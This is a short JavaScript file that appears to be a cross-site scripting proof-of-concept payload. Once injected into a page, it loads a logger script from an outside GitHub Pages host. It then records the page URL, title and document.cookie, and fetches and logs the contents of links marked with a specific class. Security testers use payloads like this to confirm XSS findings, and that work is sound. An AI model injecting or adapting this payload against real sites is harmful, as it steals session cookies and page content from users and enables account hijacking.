let node = document.querySelector('script[src*="/xss/dist/lg.js"]');
let ls = document.createElement('script');
ls.src = node && node.src.replace(/xss\.js/, 'lg.js') || 'https://defektive.github.io/xss/dist/lg.js';
node && node.parentNode.insertBefore(ls, node) || document.body.appendChild(ls);

setTimeout(function (){
  let logger = window._dfktLog || console.log;

  logger('XSS Success!!');
  logger('This page is being executed from', window.location.toString());
  logger('Document Title', document.title);
  logger('Document Cookie', document.cookie);

  var els = document.querySelectorAll('.xss-link-fetch')
  els.forEach(function (el) {
    fetch(el.href).then(function (resp){
      resp.text().then(function (text){
        logger('XSS Fetched URL', el.href, text);
      })
    });
  });
}, 1000)
